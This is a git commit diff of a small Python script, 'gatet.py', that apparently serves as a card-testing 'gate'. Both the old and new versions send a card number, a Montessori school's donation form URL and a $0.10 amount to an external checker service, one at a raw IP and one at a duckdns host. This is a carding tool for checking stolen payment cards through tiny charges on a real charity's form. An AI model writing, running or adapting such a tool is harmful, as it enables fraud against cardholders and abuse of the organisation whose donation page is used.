9fe02af4df4ebcff0b46ec45342d101e0950cfba
a06505302-cpu <a06505302@gmail.com>
2026-03-14 05:41:20 +0200

    gatet.py

--- gatet.py
+++ gatet.py
@@ -1,14 +1,13 @@
 import requests
 
-def chkk(ccx):
-    cc = ccx.strip()
-    urll = "https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1"
-    price = "0.10"
-    api = "http://151.247.197.54:5500/paypal"
-    params = {
-        "cc": cc,
-        "url": urll,
-        "price": price
-    }
-    res = requests.get(api, params=params).text
-    return res
+api = "http://gatescheck.duckdns.org:7000/check"
+
+params = {
+    "url": "https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1",
+    "card": f"",
+    "amount": 0.10
+}
+
+r = requests.get(api, params=params)
+
+print(r.json()['result'])
